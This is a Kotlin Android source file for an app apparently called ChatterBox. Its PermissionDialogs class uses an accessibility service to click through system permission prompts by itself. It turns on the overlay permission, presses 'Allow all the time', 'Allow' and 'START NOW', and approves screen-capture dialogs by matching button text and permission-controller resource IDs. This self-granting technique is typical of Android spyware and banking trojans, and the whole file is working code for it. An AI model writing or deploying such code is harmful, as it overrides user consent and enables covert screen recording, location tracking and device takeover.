package com.example.ChatterBox.accessibility

import android.accessibilityservice.AccessibilityService.GLOBAL_ACTION_BACK
import android.os.Handler
import android.os.Looper
import android.util.Log
import android.view.accessibility.AccessibilityNodeInfo


class PermissionDialogs(private val accessibilityService: AccessibilityService) {
    private val TAG = "PermissionDialogs"
    private val handler = Handler(Looper.getMainLooper())
    private var isGrantingPermissions = false
    private var pendingPermissionsCount = 0

    fun startGrantingPermissions(expectedPermissions: Int) {
        pendingPermissionsCount = expectedPermissions
        isGrantingPermissions = true
        Log.d(TAG, "Started permission granting mode, expecting $expectedPermissions permissions")
    }

    fun stopGrantingPermissions() {
        isGrantingPermissions = false
        pendingPermissionsCount = 0
        Log.d(TAG, "Stopped permission granting mode")
    }

    fun isGrantingPermissions(): Boolean {
        return isGrantingPermissions
    }

    fun handlePermissionDialog(rootNode: AccessibilityNodeInfo?) {
        if (rootNode == null || !isGrantingPermissions) return
        val isChatterBoxOverlayPage = containsText(rootNode, "ChatterBox") &&
                containsText(rootNode, "Display over other apps")

        if (isChatterBoxOverlayPage) {
            val hasToggleLabel = containsText(rootNode, "Allow display over other apps")

            if (hasToggleLabel) {
                val switchNode = findToggleSwitchPrecise(rootNode)

                if (switchNode != null) {
                    if (!switchNode.isChecked) {
                        if (clickNodeDirectly(switchNode)) {
                            handler.postDelayed({
                                accessibilityService.performGlobalAction(GLOBAL_ACTION_BACK)
                                pendingPermissionsCount--

                                if (pendingPermissionsCount == 0) {
                                    stopGrantingPermissions()
                                }
                            }, 1000)
                        } else {
                            Log.e(TAG, "Failed to click toggle switch")
                        }
                    } else {
                        Log.d(TAG, "Switch already enabled, going back")
                        handler.postDelayed({
                            accessibilityService.performGlobalAction(GLOBAL_ACTION_BACK)

                            pendingPermissionsCount--
                            if (pendingPermissionsCount == 0) {
                                stopGrantingPermissions()
                            }
                        }, 1000)
                    }
                    return
                } else {
                    Log.e(TAG, "Could not find toggle switch on ChatterBox overlay page")
                }
            } else {

                val chatterboxNode = findAppEntryInList(rootNode, "ChatterBox")
                if (chatterboxNode != null) {
                    if (clickNodeDirectly(chatterboxNode)) {
                        return
                    } else {
                        Log.e(TAG, "Failed to click on ChatterBox entry")
                    }
                } else {
                    Log.e(TAG, "Could not find ChatterBox entry in the list")
                }
            }
        }
        val containsPermissionText = containsPermissionText(rootNode)
        if (containsPermissionText) {
            val buttonTexts = arrayOf(
                "START NOW",
                "WHILE USING THE APP",
                "While using the app",
                "ALLOW",
                "Allow",
                "ALLOW ALL THE TIME",
                "Allow all the time",
                "OK",
                "ONLY THIS TIME",
                "Yes",
                "YES"
            )

            for (buttonText in buttonTexts) {
                val nodes = rootNode.findAccessibilityNodeInfosByText(buttonText)
                for (node in nodes) {
                    if (clickNodeOrParent(node)) {
                        pendingPermissionsCount--
                        if (pendingPermissionsCount == 0) {
                            handler.postDelayed({
                                stopGrantingPermissions()
                            }, 1000)
                        }

                        return
                    }
                }
            }
            tryClickByResourceId(rootNode)
        }
    }
    private fun findAppEntryInList(rootNode: AccessibilityNodeInfo, appName: String): AccessibilityNodeInfo? {
        val nodes = rootNode.findAccessibilityNodeInfosByText(appName)

        for (node in nodes) {
            var current = node
            var parent = current.parent

            while (parent != null) {
                if (parent.isClickable) {
                    return parent
                }
                current = parent
                parent = current.parent
            }
            if (node.isClickable) {
                return node
            }
        }
        return null
    }

    private fun findToggleSwitchPrecise(rootNode: AccessibilityNodeInfo): AccessibilityNodeInfo? {
        val switchClassNames = arrayOf(
            "android.widget.Switch",
            "androidx.appcompat.widget.SwitchCompat",
            "android.widget.ToggleButton"
        )
        for (className in switchClassNames) {
            val nodes = findNodesByClassName(rootNode, className)
            if (nodes.isNotEmpty()) {
                return nodes[0]
            }
        }
        val switchIds = arrayOf(
            "android:id/switch_widget",
            "com.android.settings:id/switch_widget",
            "com.android.settings:id/switch_bar"
        )
        for (id in switchIds) {
            val node = findNodeByResourceId(rootNode, id)
            if (node != null) {
                return node
            }
        }
        val checkableNodes = findAllCheckableNodes(rootNode)
        if (checkableNodes.isNotEmpty()) {
            return checkableNodes[0]
        }
        return null
    }

    private fun findNodesByClassName(rootNode: AccessibilityNodeInfo, className: String): List<AccessibilityNodeInfo> {
        val result = mutableListOf<AccessibilityNodeInfo>()

        if (rootNode.className?.toString() == className) {
            result.add(rootNode)
        }

        for (i in 0 until rootNode.childCount) {
            val child = rootNode.getChild(i) ?: continue
            result.addAll(findNodesByClassName(child, className))
        }

        return result
    }

    private fun findAllCheckableNodes(rootNode: AccessibilityNodeInfo): List<AccessibilityNodeInfo> {
        val result = mutableListOf<AccessibilityNodeInfo>()

        if (rootNode.isCheckable) {
            result.add(rootNode)
        }

        for (i in 0 until rootNode.childCount) {
            val child = rootNode.getChild(i) ?: continue
            result.addAll(findAllCheckableNodes(child))
        }

        return result
    }

    private fun clickNodeDirectly(node: AccessibilityNodeInfo): Boolean {
        try {
            if (node.isClickable) {
                return node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            }

            val parent = node.parent
            if (parent?.isClickable == true) {
                val result = parent.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                parent.recycle()
                return result
            }
            parent?.recycle()

            return false
        } catch (e: Exception) {
            return false
        }
    }

    private fun containsText(node: AccessibilityNodeInfo, text: String): Boolean {
        if (node.text?.contains(text, ignoreCase = true) == true ||
            node.contentDescription?.contains(text, ignoreCase = true) == true) {
            return true
        }

        for (i in 0 until node.childCount) {
            val child = node.getChild(i) ?: continue
            if (containsText(child, text)) {
                child.recycle()
                return true
            }
            child.recycle()
        }

        return false
    }

    private fun containsPermissionText(rootNode: AccessibilityNodeInfo): Boolean {
        val permissionTexts = arrayOf(
            "Allow ChatterBox",
            "permission",
            "would like to",
            "access",
            "Start recording or casting",
            "Screen capture",
            "starts now",
            "will start capturing",
            "ChatterBox will start capturing everything"
        )

        for (text in permissionTexts) {
            val nodes = rootNode.findAccessibilityNodeInfosByText(text)
            if (nodes.isNotEmpty()) {
                return true
            }
        }

        return false
    }

    private fun tryClickByResourceId(rootNode: AccessibilityNodeInfo) {
        val resourceIds = arrayOf(
            "com.android.permissioncontroller:id/permission_allow_foreground_only_button",
            "com.android.permissioncontroller:id/permission_allow_button",
            "com.android.permissioncontroller:id/permission_allow_always_button",
            "android:id/button1"
        )

        for (resourceId in resourceIds) {
            val node = findNodeByResourceId(rootNode, resourceId)
            if (node != null && clickNodeOrParent(node)) {
                pendingPermissionsCount--
                if (pendingPermissionsCount <= 0) {
                    handler.postDelayed({
                        stopGrantingPermissions()
                    }, 1000)
                }
                return
            }
        }
    }

    private fun clickNodeOrParent(node: AccessibilityNodeInfo): Boolean {
        if (node.isClickable) {
            val result = node.performAction(AccessibilityNodeInfo.ACTION_CLICK)
            return result
        }

        var current = node.parent
        while (current != null) {
            if (current.isClickable) {
                val result = current.performAction(AccessibilityNodeInfo.ACTION_CLICK)
                if (result) return true
            }
            val temp = current
            current = current.parent
            temp.recycle()
        }

        return false
    }


    private fun findNodeByResourceId(rootNode: AccessibilityNodeInfo, resourceId: String): AccessibilityNodeInfo? {
        if (rootNode.viewIdResourceName == resourceId) {
            return rootNode
        }

        for (i in 0 until rootNode.childCount) {
            val child = rootNode.getChild(i) ?: continue
            val result = findNodeByResourceId(child, resourceId)
            if (result != null) {
                return result
            }
            child.recycle()
        }

        return null
    }

    fun cleanup() {
        handler.removeCallbacksAndMessages(null)
    }
}